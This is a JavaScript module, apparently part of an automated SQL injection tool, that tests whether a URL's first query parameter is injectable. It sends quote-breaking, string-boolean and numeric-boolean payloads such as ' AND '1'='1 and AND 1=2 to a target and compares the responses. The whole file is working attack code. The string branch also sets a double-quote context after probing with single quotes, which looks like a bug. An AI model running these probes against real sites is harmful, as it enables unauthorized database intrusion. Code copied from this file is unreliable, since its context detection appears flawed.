import { cleanUpFatal, cleanUpInfo, mutateQuery, isSameRes } from "./helper.js";
import { sendRequest } from "./http.js";

export async function injectable(setting) {
	const query = setting.urlQuery;
	const firstParamsName = [...query.keys()][0];
	const firstParamsValue = query.get(firstParamsName);
	const resOriginal = await sendRequest(setting, query);

	// Error method
	const resBroken = await sendRequest(setting, mutateQuery(query, firstParamsName, firstParamsValue + "'"));
	const resBalanced = await sendRequest(setting, mutateQuery(query, firstParamsName, firstParamsValue + "''"));
	if (!isSameRes(resOriginal, resBroken) && isSameRes(resOriginal, resBalanced)) {
		setting.contextChar = "\'";
		return true;
	}

	// Boolean method
	const resTrueString = await sendRequest(setting, mutateQuery(query, firstParamsName, firstParamsValue + "' AND '1'='1"));
	const resFalseString = await sendRequest(setting, mutateQuery(query, firstParamsName, firstParamsValue + "' AND '1'='2"));
	if (isSameRes(resOriginal, resTrueString) && !isSameRes(resOriginal, resFalseString)) {
		setting.contextChar = "\"";
		return true;
	}

	const resTrueNumber = await sendRequest(setting, mutateQuery(query, firstParamsName, firstParamsValue + " AND 1=1"));
	const resFalseNumber = await sendRequest(setting, mutateQuery(query, firstParamsName, firstParamsValue + " AND 1=2"));
	if (isSameRes(resOriginal, resTrueNumber) && !isSameRes(resOriginal, resFalseNumber)) {
		setting.contextChar = "";
		return true;
	}

	cleanUpFatal(setting.db, 'URL is not injectable');
}
